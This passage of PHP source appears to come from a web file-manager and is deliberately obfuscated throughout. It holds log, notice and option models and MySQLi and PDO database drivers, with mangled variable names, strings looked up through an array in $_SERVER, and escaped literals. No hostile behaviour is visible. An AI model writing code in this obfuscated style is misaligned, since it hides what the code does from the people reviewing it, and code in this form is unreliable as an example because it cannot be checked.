($™ó‰ò –[$ŸæÏ–í“[33]] == $ŸæÏ–í“[627]) { $™ó‰ò –[$ŸæÏ–í“[528]][$ŸæÏ–í“[1252]] = $Ø È‹­è[$™ó‰ò –[$ŸæÏ–í“[528]][$ŸæÏ–í“[1252]]]; $™ó‰ò –[$ŸæÏ–í“[528]][$ŸæÏ–í“[1253]] = $Ø È‹­è[$™ó‰ò –[$ŸæÏ–í“[528]][$ŸæÏ–í“[1253]]]; } if ($™ó‰ò –[$ŸæÏ–í“[33]] == $ŸæÏ–í“[2232]) { $™ó‰ò –[$ŸæÏ–í“[528]][$ŸæÏ–í“[193]] = $Ø È‹­è[$™ó‰ò –[$ŸæÏ–í“[528]][$ŸæÏ–í“[193]]]; } if ($™ó‰ò –[$ŸæÏ–í“[33]] == $ŸæÏ–í“[1952]) { $™ó‰ò –[$ŸæÏ–í“[2237]] = $™ó‰ò –[$ŸæÏ–í“[90]]; $™ó‰ò –[$ŸæÏ–í“[2221]] = $™ó‰ò –[$ŸæÏ–í“[2237]][$ŸæÏ–í“[193]]; $™ó‰ò –[$ŸæÏ–í“[90]] = !1; $™ó‰ò –[$ŸæÏ–í“[193]] = $ŸæÏ–í“[12]; } $õ¤¤¤Ê¾ = array($ŸæÏ–í“[1952], $ŸæÏ–í“[2219]); if (!in_array($™ó‰ò –[$ŸæÏ–í“[33]], $õ¤¤¤Ê¾)) { if ($™ó‰ò –[$ŸæÏ–í“[90]] && $™ó‰ò –[$ŸæÏ–í“[90]][$ŸæÏ–í“[190]] == $ŸæÏ–í“[191]) { $î†É¸ëÊ[] = $éÑûÃıŞ[$ŸæÏ–í“[477]]; unset($ñ·ÇÍ—›[$Ì ƒ¦Ô¾]); continue; } if ($™ó‰ò –[$ŸæÏ–í“[2237]] && $™ó‰ò –[$ŸæÏ–í“[2237]][$ŸæÏ–í“[190]] == $ŸæÏ–í“[191]) { $î†É¸ëÊ[] = $éÑûÃıŞ[$ŸæÏ–í“[477]]; unset($ñ·ÇÍ—›[$Ì ƒ¦Ô¾]); continue; } } } $éÑûÃıŞ[$ŸæÏ–í“[528]] = $™ó‰ò –; unset($éÑûÃıŞ[$ŸæÏ–í“[2458]]); $õ¥¯½Ë¨[] = $éÑûÃıŞ; } $this->clearSystemPathLog($î†É¸ëÊ); return $õ¥¯½Ë¨; } private function clearSystemPathLog($ßŠ Ôø) { $ÇˆìğÈ– =& $_SERVER[†ûãı«°]; if (count($ßŠ Ôø) == 0) { return; } $ò¨†¦Àù = array($ÇˆìğÈ–[477] => array($ÇˆìğÈ–[7], array_unique($ßŠ Ôø))); $this->where($ò¨†¦Àù)->delete(); } public function deviceList($ÇÖÛÇ©Ö, $ƒ…æ¼¦Œ = 0) { $¢±¯úÖñ =& $_SERVER[†ûãı«°]; $Ì¿±İú˜ = array($¢±¯úÖñ[1783] => $ÇÖÛÇ©Ö, $¢±¯úÖñ[233] => array($¢±¯úÖñ[1102], $ƒ…æ¼¦Œ), $¢±¯úÖñ[33] => $¢±¯úÖñ[1926]); $‡ÄÑ—ß = array(); $İÛ­ãôÑ = $this->field($¢±¯úÖñ[2459])->where($Ì¿±İú˜)->order($¢±¯úÖñ[2235])->limit(50)->select(); foreach ($İÛ­ãôÑ as $›È´» => $ìºÖ¾„ø) { if ($›È´» > 0 && abs($ìºÖ¾„ø[$¢±¯úÖñ[233]] - $İÛ­ãôÑ[$›È´» - 1][$¢±¯úÖñ[233]]) < 5) { continue; } $Á„çî›Ì = json_decode($ìºÖ¾„ø[$¢±¯úÖñ[528]], !0); $ìºÖ¾„ø[$¢±¯úÖñ[2449]] = isset($Á„çî›Ì[$¢±¯úÖñ[2449]]) ? $Á„çî›Ì[$¢±¯úÖñ[2449]] : $¢±¯úÖñ[12]; unset($Á„çî›Ì[$¢±¯úÖñ[2449]]); $ãĞæ²ş¶ = $this->deviceType($Á„çî›Ì[$¢±¯úÖñ[2224]]); if (isset($‡ÄÑ—ß[$ãĞæ²ş¶])) { continue; } $ìºÖ¾„ø[$¢±¯úÖñ[2453]] = IpLocation::get($ìºÖ¾„ø[$¢±¯úÖñ[2449]]); $ìºÖ¾„ø[$¢±¯úÖñ[528]] = $Á„çî›Ì; $‡ÄÑ—ß[$ãĞæ²ş¶] = $ìºÖ¾„ø; } return array_values($‡ÄÑ—ß); } public function deviceType($‡‚”µ­Ê) { return $‡‚”µ­Ê; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x6e\157\x74\151\x63\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x63\x6f\x6e\164\x65\156\x74", "\x61\165\164\150", "\x6d\157\144\145", "\x74\x69\155\x65", "\x74\171\160\145", "\x6c\145\x76\x65\x6c", "\145\156\x61\142\x6c\145", "\163\157\162\x74"); public function listData($¨Â¬Áî– = false, $Õ»ğÚø = "\163\x6f\x72\x74", $›±’Ë„¯ = false) { return parent::listData($¨Â¬Áî–, $Õ»ğÚø, $›±’Ë„¯); } public function add($Ù³˜´±–) { $»ÛÖ¢òğ =& $_SERVER[†ûãı«°]; $Ï»øÔùí = time(); if ($Ù³˜´±–[$»ÛÖ¢òğ[16]] == $»ÛÖ¢òğ[2460]) { $Ï»øÔùí = strtotime($Ù³˜´±–[$»ÛÖ¢òğ[206]]); } $Ù³˜´±–[$»ÛÖ¢òğ[206]] = $Ï»øÔùí; return parent::insert($Ù³˜´±–); } public function update($™ıĞ ÈÒ, $©Ãæ—¯) { $¡‚ó¶ =& $_SERVER[†ûãı«°]; $Í½ßö—è = $this->listData($™ıĞ ÈÒ); if (!$Í½ßö—è) { return !1; } $‡¶õúØ— = time(); if ($©Ãæ—¯[$¡‚ó¶[16]] == $¡‚ó¶[2460]) { $‡¶õúØ— = strtotime($©Ãæ—¯[$¡‚ó¶[206]]); } $©Ãæ—¯[$¡‚ó¶[206]] = $‡¶õúØ—; return parent::update($™ıĞ ÈÒ, $©Ãæ—¯); } public function remove($ØÛ®É Õ) { $ˆ’ò¹Ù› = $this->listData($ØÛ®É Õ); if (!$ˆ’ò¹Ù› || $ˆ’ò¹Ù›[$_SERVER[†ûãı«°][191]]) { return !1; } return parent::remove($ØÛ®É Õ); } public function sort($ü¡ışíÇ, $¤ÑëìÈÖ) { return parent::update($ü¡ışíÇ, $¤ÑëìÈÖ); } public function enable($§ºØòÙü, $†„îŒûó) { return parent::update($§ºØòÙü, array($_SERVER[†ûãı«°][2461] => $†„îŒûó)); } private function initUserOption() { $’Ã Ùí =& $_SERVER[†ûãı«°]; $this->optionType = $’Ã Ùí[2462]; $this->modelType = $’Ã Ùí[2463]; $this->field = array($’Ã Ùí[2464], $’Ã Ùí[32], $’Ã Ùí[206], $’Ã Ùí[33], $’Ã Ùí[2465], $’Ã Ùí[826], $’Ã Ùí[228]); } public function userNoticeGet($ˆï£ãšñ = false) { $this->initUserOption(); return parent::listData($ˆï£ãšñ, $_SERVER[†ûãı«°][477], !0); } public function userNoticeAdd($––ï’êí) { $†–€˜ÄÓ =& $_SERVER[†ûãı«°]; $this->initUserOption(); $ÖÙĞÓÄ› = $this->findByKey($†–€˜ÄÓ[2464], $––ï’êí[$†–€˜ÄÓ[477]]); if ($ÖÙĞÓÄ›) { return !0; } $ÓõŸÈŞÌ = array($†–€˜ÄÓ[2464] => $––ï’êí[$†–€˜ÄÓ[477]], $†–€˜ÄÓ[32] => $––ï’êí[$†–€˜ÄÓ[32]], $†–€˜ÄÓ[206] => $––ï’êí[$†–€˜ÄÓ[206]], $†–€˜ÄÓ[33] => isset($––ï’êí[$†–€˜ÄÓ[33]]) ? $––ï’êí[$†–€˜ÄÓ[33]] : 1, $†–€˜ÄÓ[2465] => isset($––ï’êí[$†–€˜ÄÓ[2465]]) ? $––ï’êí[$†–€˜ÄÓ[2465]] : 0, $†–€˜ÄÓ[826] => 0, $†–€˜ÄÓ[228] => 0); return parent::insert($ÓõŸÈŞÌ); } public function userNoticeEdit($ÜÍİâí˜, $€İØ˜±œ) { $this->initUserOption(); return parent::update($ÜÍİâí˜, $€İØ˜±œ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\x6d\137\x6f\160\164\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\154\145", "\x72\x6f\154\x65\x47\x72\x6f\x75\x70", "\x72\145\147\x69\x73\x74", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($şšøÒÀä) { return "\x53\171\163\x74\145\x6d\x4f\x70\x74\x69\x6f\156\137{$şšøÒÀä}"; } protected function optionDefault($Ú“Ÿºí = '') { $™Òñ¢©Š =& $_SERVER[†ûãı«°]; if ($Ú“Ÿºí == $™Òñ¢©Š[12]) { return $GLOBALS[$™Òñ¢©Š[6]][$™Òñ¢©Š[459]]; } } } goto Fö¸¦‡³Š; C›Òù±‹´Œ: class DbMysqli extends Db { public function __construct($Åşæ·ˆ» = '') { $£øË¨Ë =& $_SERVER[†ûãı«°]; if (!extension_loaded($£øË¨Ë[1000])) { think_exception(think_lang($£øË¨Ë[14]) . $£øË¨Ë[1001]); } if (!empty($Åşæ·ˆ»)) { $this->config = $Åşæ·ˆ»; if (empty($this->config[$£øË¨Ë[17]])) { $this->config[$£øË¨Ë[17]] = $£øË¨Ë[12]; } } } public function connect($—´§êËâ = '', $˜¯ŠÕÛ = 0) { $ÔÅ¿Æòğ =& $_SERVER[†ûãı«°]; if (!isset($this->linkID[$˜¯ŠÕÛ])) { if (empty($—´§êËâ)) { $—´§êËâ = $this->config; } $this->linkID[$˜¯ŠÕÛ] = new mysqli($—´§êËâ[$ÔÅ¿Æòğ[974]], $—´§êËâ[$ÔÅ¿Æòğ[976]], $—´§êËâ[$ÔÅ¿Æòğ[977]], $—´§êËâ[$ÔÅ¿Æòğ[21]], $—´§êËâ[$ÔÅ¿Æòğ[975]] ? intval($—´§êËâ[$ÔÅ¿Æòğ[975]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¢°…¡† = $this->linkID[$˜¯ŠÕÛ]->server_version; $this->linkID[$˜¯ŠÕÛ]->query($ÔÅ¿Æòğ[978] . think_config($ÔÅ¿Æòğ[979]) . $ÔÅ¿Æòğ[58]); if ($¢°…¡† > $ÔÅ¿Æòğ[980]) { $this->linkID[$˜¯ŠÕÛ]->query($ÔÅ¿Æòğ[981]); } $this->connected = !0; if (1 != think_config($ÔÅ¿Æòğ[22])) { unset($this->config); } } return $this->linkID[$˜¯ŠÕÛ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¤ã¦¥‰Ä) { $–İÄÌ¸ğ =& $_SERVER[†ûãı«°]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¤ã¦¥‰Ä; if ($this->queryID) { $this->free(); } think_action_status($–İÄÌ¸ğ[23], 1); think_status($–İÄÌ¸ğ[24]); $this->queryID = $this->_linkID->query($¤ã¦¥‰Ä); if ($this->_linkID->more_results()) { while (($ş‚Ÿ‹Ì¼ = $this->_linkID->next_result()) != NULL) { $ş‚Ÿ‹Ì¼->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÅâÑÍ•²) { $×ßçùåì =& $_SERVER[†ûãı«°]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÅâÑÍ•²; if ($this->queryID) { $this->free(); } think_action_status($×ßçùåì[25], 1); think_status($×ßçùåì[24]); $Í¤¦•ÆŞ = $this->_linkID->query($ÅâÑÍ•²); $this->debug(); if (!1 === $Í¤¦•ÆŞ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Şâ…µµ¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Şâ…µµ¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»Å¤ÇÅ• = $this->_linkID->rollback(); $this->transTimes = 0; if (!$»Å¤ÇÅ•) { $this->error(); return !1; } } return !0; } private function getAll() { $“²„æ« = array(); if ($this->numRows > 0) { for ($§¢³×üß = 0; $§¢³×üß < $this->numRows; $§¢³×üß++) { $“²„æ«[$§¢³×üß] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $“²„æ«; } public function getFields($å–¯ôÊ°) { $…›©¡Ñ =& $_SERVER[†ûãı«°]; $ÕøÌ‚Ä† = $this->query($…›©¡Ñ[985] . $this->parseKey($å–¯ôÊ°)); $· ´¸§Æ = array(); if ($ÕøÌ‚Ä†) { foreach ($ÕøÌ‚Ä† as $‘ş³½Ú¾ => $õ×£ ˜) { $· ´¸§Æ[$õ×£ ˜[$…›©¡Ñ[31]]] = array($…›©¡Ñ[32] => $õ×£ ˜[$…›©¡Ñ[31]], $…›©¡Ñ[33] => $õ×£ ˜[$…›©¡Ñ[34]], $…›©¡Ñ[35] => (bool) ($õ×£ ˜[$…›©¡Ñ[36]] === $…›©¡Ñ[12]), $…›©¡Ñ[37] => $õ×£ ˜[$…›©¡Ñ[38]], $…›©¡Ñ[39] => strtolower($õ×£ ˜[$…›©¡Ñ[40]]) == $…›©¡Ñ[41], $…›©¡Ñ[42] => strtolower($õ×£ ˜[$…›©¡Ñ[43]]) == $…›©¡Ñ[44]); } } return $· ´¸§Æ; } public function getTables($¥ÔÎ÷»» = '') { $¸Ì”¢æ” =& $_SERVER[†ûãı«°]; $Ş–Í“•‚ = !empty($¥ÔÎ÷»») ? $¸Ì”¢æ”[987] . $¥ÔÎ÷»» . $¸Ì”¢æ”[988] : $¸Ì”¢æ”[989]; $˜éÆş± = $this->query($Ş–Í“•‚); $¨²½²–ë = array(); if ($˜éÆş±) { foreach ($˜éÆş± as $–¯Ëã½‚ => $úÛ“¢—Û) { $¨²½²–ë[$–¯Ëã½‚] = current($úÛ“¢—Û); } } return $¨²½²–ë; } public function replace($¤Ã•ëœ, $Î£‡ƒ—Ö = array()) { $ÄŸü¥Ïå =& $_SERVER[†ûãı«°]; foreach ($¤Ã•ëœ as $£‰ˆûØÄ => $Ê¼«„†ì) { $ òşÑ« = $this->parseValue($Ê¼«„†ì); if (is_scalar($ òşÑ«)) { $·¯ö³ı—[] = $ òşÑ«; $÷ª€òÍ–[] = $this->parseKey($£‰ˆûØÄ); } } $ÁòĞÖ = $ÄŸü¥Ïå[990] . $this->parseTable($Î£‡ƒ—Ö[$ÄŸü¥Ïå[358]]) . $ÄŸü¥Ïå[991] . implode($ÄŸü¥Ïå[50], $÷ª€òÍ–) . $ÄŸü¥Ïå[992] . implode($ÄŸü¥Ïå[50], $·¯ö³ı—) . $ÄŸü¥Ïå[993]; return $this->execute($ÁòĞÖ); } public function insertAll($Îè¡éˆ, $Ñ„¬÷öÛ = array(), $ò½­ôœ = false) { $òæÓ÷Â÷ =& $_SERVER[†ûãı«°]; if (!is_array($Îè¡éˆ[0])) { return !1; } $ó£ş“ÔŞ = array_keys($Îè¡éˆ[0]); $Ä§ô ôÎ = array(); foreach ($Îè¡éˆ as $ğâŞ¿Æ­) { $àÁÊ–¢“ = array(); foreach ($ğâŞ¿Æ­ as $ÀíĞúôÒ => $Ó»Û’œØ) { $Ó»Û’œØ = $this->parseValue($Ó»Û’œØ); if (is_scalar($Ó»Û’œØ)) { $àÁÊ–¢“[] = $Ó»Û’œØ; } } $Ä§ô ôÎ[] = $òæÓ÷Â÷[339] . implode($òæÓ÷Â÷[50], $àÁÊ–¢“) . $òæÓ÷Â÷[993]; } array_walk($ó£ş“ÔŞ, array($this, $òæÓ÷Â÷[994])); $à÷—¤‹Ã = $ò½­ôœ ? $òæÓ÷Â÷[995] : $òæÓ÷Â÷[996]; $¥€¯·Öâ = $à÷—¤‹Ã . $òæÓ÷Â÷[997] . $this->parseTable($Ñ„¬÷öÛ[$òæÓ÷Â÷[358]]) . $òæÓ÷Â÷[991] . implode($òæÓ÷Â÷[50], $ó£ş“ÔŞ) . $òæÓ÷Â÷[998] . implode($òæÓ÷Â÷[50], $Ä§ô ôÎ); return $this->execute($¥€¯·Öâ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $şÔî‡Œ =& $_SERVER[†ûãı«°]; $this->error = $this->_linkID->errno . $şÔî‡Œ[4] . $this->_linkID->error; if ($şÔî‡Œ[12] != $this->queryStr) { $this->error .= LNG($şÔî‡Œ[48]) . $this->queryStr; } think_trace($this->error, $şÔî‡Œ[12], $şÔî‡Œ[49]); return $this->error; } public function escapeString($™¦°õÍ˜) { if ($this->_linkID) { return $this->_linkID->real_escape_string($™¦°õÍ˜); } else { return addslashes($™¦°õÍ˜); } } public function parseKey(&$ˆ±à€êØ, $ş°ÍáÑğ = true) { $Ì®óİğş =& $_SERVER[†ûãı«°]; if ($ş°ÍáÑğ) { $ˆ±à€êØ = $this->parseKeyCheck($ˆ±à€êØ); } if ($ˆ±à€êØ != $Ì®óİğş[222] && !preg_match($Ì®óİğş[999], $ˆ±à€êØ)) { $ˆ±à€êØ = $Ì®óİğş[463] . trim($ˆ±à€êØ, $Ì®óİğş[463]) . $Ì®óİğş[463]; } return $ˆ±à€êØ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ş©ºÀªˆ = '') { $×¦¬’Ëœ =& $_SERVER[†ûãı«°]; if (!class_exists($×¦¬’Ëœ[1002])) { think_exception(think_lang($×¦¬’Ëœ[14]) . $×¦¬’Ëœ[1003]); } if (!empty($Ş©ºÀªˆ)) { $this->config = $Ş©ºÀªˆ; if (empty($this->config[$×¦¬’Ëœ[17]])) { $this->config[$×¦¬’Ëœ[17]] = array(); } } } public function connect($¿”Âôƒñ = '', $ıëñ±¬ = 0) { $¼›á ¦« =& $_SERVER[†ûãı«°]; if (!isset($this->linkID[$ıëñ±¬])) { if (empty($¿”Âôƒñ)) { $¿”Âôƒñ = $this->config; } $İÉûÍ¾ = !empty($¿”Âôƒñ[$¼›á ¦«[17]][$¼›á ¦«[18]]) ? $¿”Âôƒñ[$¼›á ¦«[17]][$¼›á ¦«[18]] : $this->pconnect; if ($İÉûÍ¾) { $¿”Âôƒñ[$¼›á ¦«[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ıëñ±¬] = new PDO($¿”Âôƒñ[$¼›á ¦«[1004]], $¿”Âôƒñ[$¼›á ¦«[976]], $¿”Âôƒñ[$¼›á ¦«[977]], $¿”Âôƒñ[$¼›á ¦«[17]]); } catch (PDOException $®’¾£Ì‡) { think_exception($®’¾£Ì‡->getMessage()); } $this->dbType = $this->_getDsnType($¿”Âôƒñ[$¼›á ¦«[1004]]); if (in_array($this->dbType, array($¼›á ¦«[1005], $¼›á ¦«[1006], $¼›á ¦«[1007], $¼›á ¦«[1008]))) { think_exception($¼›á ¦«[1009] . $this->dbType . $¼›á ¦«[1010] . $this->dbType . $¼›á ¦«[1011]); } if (!$this->linkID[$ıëñ±¬]) { think_exception($¼›á ¦«[1012]); } try { $this->linkID[$ıëñ±¬]->exec($¼›á ¦«[1013] . think_config($¼›á ¦«[979])); } catch (Exception $®’¾£Ì‡) { } $this->connected = !0; if (1 != think_config($¼›á ¦«[22])) { unset($this->config); } } return $this->linkID[$ıëñ±¬]; } public function free() { $this->PDOStatement = null; } public function query($È…¶ÕÛ°, $ çåÂ‡ª = array()) { $•ÜÖÔ¨ =& $_SERVER[†ûãı«°]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $È…¶ÕÛ°; if (!empty($ çåÂ‡ª)) { $this->queryStr .= $•ÜÖÔ¨[1014] . print_r($ çåÂ‡ª, !0) . $•ÜÖÔ¨[1015]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($•ÜÖÔ¨[23], 1); think_status($•ÜÖÔ¨[24]); $this->PDOStatement = $this->_linkID->prepare($È…¶ÕÛ°); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‹ƒñ¥‚ˆ = $this->PDOStatement->execute($ çåÂ‡ª); $this->debug(); if (!1 === $‹ƒñ¥‚ˆ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ú¨—ú¢Ä, $“É†¦Ÿé = array()) { $éˆ´­œÔ =& $_SERVER[†ûãı«°]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ú¨—ú¢Ä; if (!empty($“É†¦Ÿé)) { $this->queryStr .= $éˆ´­œÔ[1014] . print_r($“É†¦Ÿé, !0) . $éˆ´­œÔ[1015]; } $—ş¶Öø = !1; if ($this->dbType == $éˆ´­œÔ[1008]) { if (preg_match($éˆ´­œÔ[1016], $this->queryStr, $©£Úä™›)) { $this->table = think_config($éˆ´­œÔ[1017]) . str_ireplace(think_config($éˆ´­œÔ[1018]), $éˆ´­œÔ[456], $©£Úä™›[2]); $—ş¶Öø = (bool) $this->query($éˆ´­œÔ[1019] . strtoupper($this->table) . $éˆ´­œÔ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($éˆ´­œÔ[25], 1); think_status($éˆ´­œÔ[24]); $this->PDOStatement = $this->_linkID->prepare($Ú¨—ú¢Ä); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ô•Ì˜çµ = $this->PDOStatement->execute($“É†¦Ÿé); $this->debug(); if (!1 === $ô•Ì˜çµ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($—ş¶Öø || preg_match($éˆ´­œÔ[1020], $Ú¨—ú¢Ä)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ş±“˜ó = $this->_linkID->commit(); $this->transTimes = 0; if (!$ş±“˜ó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ƒ¦ßíÛê = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ƒ¦ßíÛê) { $this->error(); return !1; } } return !0; } private function getAll() { $”êœİš¾ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($”êœİš¾); return $”êœİš¾; } public function getFields($¼±µ¥ÖÓ) { $›©’¥ßÛ =& $_SERVER[†ûãı«°]; $this->initConnect(!0); if (think_config($›©’¥ßÛ[1021])) { $±Å™¦Ûß = str_replace($›©’¥ßÛ[1022], $¼±µ¥ÖÓ, think_config($›©’¥ßÛ[1021])); } else { switch ($this->dbType) { case $›©’¥ßÛ[1005]: case $›©’¥ßÛ[1023]: $±Å™¦Ûß = "\x53\x45\x4c\x45\x43\124\x20\40\40\x63\157\x6c\x75\x6d\156\x5f\x6e\x61\x6d\x65\x20\141\x73\x20\x27\x4e\x61\155\x65\x27\x2c\x20\x20\40\144\141\164\x61\137\x74\171\160\x65\x20\141\x73\x20\x27\124\171\160\x65\47\x2c\40\40\x20\x63\157\154\x75\x6d\x6e\137\x64\x65\146\x61\165\x6c\x74\x20\141\163\x20\47\x44\145\x66\141\x75\154\164\x27\54\40\40\40\x69\163\137\x6e\165\x6c\x6c\141\142\x6c\x65\x20\x61\163\40\47\116\165\154\x6c\x27\12\x9\11\x46\x52\x4f\115\x9\151\156\x66\157\162\x6d\x61\164\151\x6f\156\x5f\x73\143\150\145\155\141\56\x74\x61\142\x6c\145\163\40\x41\123\40\164\12\x9\x9\x4a\117\x49\x4e\x9\x69\x6e\x66\157\x72\x6d\x61\x74\151\x6f\156\137\x73\143\x68\x65\155\141\x2e\143\x6f\154\165\x6d\x6e\x73\x20\x41\x53\x20\x63\xa\11\11\117\x4e\40\x20\164\56\164\141\142\154\145\137\143\141\x74\141\154\x6f\147\x20\75\x20\x63\56\x74\141\142\x6c\x65\137\x63\141\164\141\154\157\147\12\x9\x9\x41\116\x44\x20\164\56\x74\x61\142\x6c\145\x5f\x73\x63\150\145\155\x61\x20\x3d\40\143\x2e\164\141\x62\154\145\137\x73\x63\150\x65\x6d\x61\xa\x9\x9\101\x4e\x44\x20\164\x2e\164\141\142\154\145\x5f\156\x61\155\x65\x20\75\40\143\56\x74\141\x62\x6c\145\137\x6e\141\155\145\xa\x9\11\127\x48\x45\122\105\40\x20\40\x74\x2e\x74\141\142\154\145\137\x6e\141\155\x65\40\75\40\x27{$¼±µ¥ÖÓ}\47"; break; case $›©’¥ßÛ[1024]: $±Å™¦Ûß = $›©’¥ßÛ[1025] . $¼±µ¥ÖÓ . $›©’¥ßÛ[1026]; break; case $›©’¥ßÛ[1006]: case $›©’¥ßÛ[1008]: $±Å™¦Ûß = $›©’¥ßÛ[1027] . $›©’¥ßÛ[1028] . $›©’¥ßÛ[1029] . strtoupper($¼±µ¥ÖÓ) . $›©’¥ßÛ[1030] . strtoupper($¼±µ¥ÖÓ) . $›©’¥ßÛ[1031]; break; case $›©’¥ßÛ[1032]: $±Å™¦Ûß = $›©’¥ßÛ[1033] . $¼±µ¥ÖÓ . $›©’¥ßÛ[1034]; break; case $›©’¥ßÛ[1007]: break; case $›©’¥ßÛ[1035]: default: $±Å™¦Ûß = $›©’¥ßÛ[1036] . ($this->dbType == $›©’¥ßÛ[1035] ? "\x60{$¼±µ¥ÖÓ}\x60" : $¼±µ¥ÖÓ); } } $ÊàÆ¬ÜÁ = $this->query($±Å™¦Ûß); $‡÷İıñ = array(); if ($ÊàÆ¬ÜÁ) { foreach ($ÊàÆ¬ÜÁ as $Ó¯Ôíú© => $ß•ÜÜ×Ê) { $ß•ÜÜ×Ê = array_change_key_case($ß•ÜÜ×Ê); $ß•ÜÜ×Ê[$›©’¥ßÛ[32]] = isset($ß•ÜÜ×Ê[$›©’¥ßÛ[32]]) ? $ß•ÜÜ×Ê[$›©’¥ßÛ[32]] : $›©’¥ßÛ[456]; $ß•ÜÜ×Ê[$›©’¥ßÛ[33]] = isset($ß•ÜÜ×Ê[$›©’¥ßÛ[33]]) ? $ß•ÜÜ×Ê[$›©’¥ßÛ[33]] : $›©’¥ßÛ[456]; $µÇú–”ú = isset($ß•ÜÜ×Ê[$›©’¥ßÛ[352]]) ? $ß•ÜÜ×Ê[$›©’¥ßÛ[352]] : $ß•ÜÜ×Ê[$›©’¥ßÛ[32]]; $‡÷İıñ[$µÇú–”ú] = array($›©’¥ßÛ[32] => $µÇú–”ú, $›©’¥ßÛ[33] => $ß•ÜÜ×Ê[$›©’¥ßÛ[33]], $›©’¥ßÛ[35] => (bool) (isset($ß•ÜÜ×Ê[$›©’¥ßÛ[106]]) && $ß•ÜÜ×Ê[$›©’¥ßÛ[106]] === $›©’¥ßÛ[12] || isset($ß•ÜÜ×Ê[$›©’¥ßÛ[35]]) && $ß•ÜÜ×Ê[$›©’¥ßÛ[35]] === $›©’¥ßÛ[12]), $›©’¥ßÛ[37] => isset($ß•ÜÜ×Ê[$›©’¥ßÛ[37]]) ? $ß•ÜÜ×Ê[$›©’¥ßÛ[37]] : (isset($ß•ÜÜ×Ê[$›©’¥ßÛ[56]]) ? $ß•ÜÜ×Ê[$›©’¥ßÛ[56]] : $›©’¥ßÛ[456]), $›©’¥ßÛ[39] => isset($ß•ÜÜ×Ê[$›©’¥ßÛ[97]]) ? strtolower($ß•ÜÜ×Ê[$›©’¥ßÛ[97]]) == $›©’¥ßÛ[41] : (isset($ß•ÜÜ×Ê[$›©’¥ßÛ[57]]) ? $ß•ÜÜ×Ê[$›©’¥ßÛ[57]] : !1), $›©’¥ßÛ[42] => isset($ß•ÜÜ×Ê[$›©’¥ßÛ[1037]]) ? strtolower($ß•ÜÜ×Ê[$›©’¥ßÛ[1037]]) == $›©’¥ßÛ[44] : (isset($ß•ÜÜ×Ê[$›©’¥ßÛ[97]]) ? $ß•ÜÜ×Ê[$›©’¥ßÛ[97]] : !1)); } } return $‡÷İıñ; } public function getTables($„ëÍúæš = '') { $°ƒ¬Ì¿ =& $_SERVER[†ûãı«°]; if (think_config($°ƒ¬Ì¿[1038])) { $î¯ŞßçÈ = str_replace($°ƒ¬Ì¿[1039], $„ëÍúæš, think_config($°ƒ¬Ì¿[1038])); } else { switch ($this->dbType) { case $°ƒ¬Ì¿[1006]: case $°ƒ¬Ì¿[1008]: $î¯ŞßçÈ = $°ƒ¬Ì¿[1040]; break; case $°ƒ¬Ì¿[1005]: case $°ƒ¬Ì¿[1023]: $î¯ŞßçÈ = $°ƒ¬Ì¿[1041]; break; case $°ƒ¬Ì¿[1032]: $î¯ŞßçÈ = $°ƒ¬Ì¿[1042]; break; case $°ƒ¬Ì¿[1007]: think_exception(think_lang($°ƒ¬Ì¿[1043]) . $°ƒ¬Ì¿[1044]); break; case $°ƒ¬Ì¿[1024]: $î¯ŞßçÈ = $°ƒ¬Ì¿[45] . $°ƒ¬Ì¿[46] . $°ƒ¬Ì¿[47]; break; case $°ƒ¬Ì¿[1035]: default: if (!empty($„ëÍúæš)) { $î¯ŞßçÈ = $°ƒ¬Ì¿[987] . $„ëÍúæš . $°ƒ¬Ì¿[988]; } else { $î¯ŞßçÈ = $°ƒ¬Ì¿[989]; } } } $Ò„é‡ÊË = $this->query($î¯ŞßçÈ); $ø¾ª¤¬— = array(); foreach ($Ò„é‡ÊË as $¹°ÆË¸­ => $Ñç†) { $ø¾ª¤¬—[$¹°ÆË¸­] = current($Ñç†); } return $ø¾ª¤¬—; } protected function parseLimit($Ëé¯­©é) { $×Š³ÍŠ =& $_SERVER[†ûãı«°]; $È¤³Š = 